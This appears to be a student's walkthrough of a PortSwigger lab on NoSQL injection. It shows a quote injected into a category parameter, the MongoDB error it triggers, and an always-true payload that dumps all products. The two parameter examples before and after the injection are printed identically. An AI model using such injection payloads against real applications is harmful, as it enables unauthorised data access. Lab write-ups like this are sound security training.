# URL
https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection
# Concept
* testing NoSQL injection vulnerability
# Method of solve
* in the app, we can select the category to filter for
* in the resulting webpage, we see this URL parameter:
```
category='Food+%26+Drink
```
* and we can try to inject a single-quote `'` into the parameter to see if we can elicit a change in behavior
```
category='Food+%26+Drink
```
* this causes an error, which looks like this:
```
Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: missing ; before statement : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "SyntaxError: missing ; before statement :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
```
* this points to the possibility that the web app is using a MongoDB NoSQL database
* from here, we try some MongoDB NoSQL injection payloads to determine if we can output additional information from the database
* this payload will output all of the products from the database:
```
'||'1'=='1
```
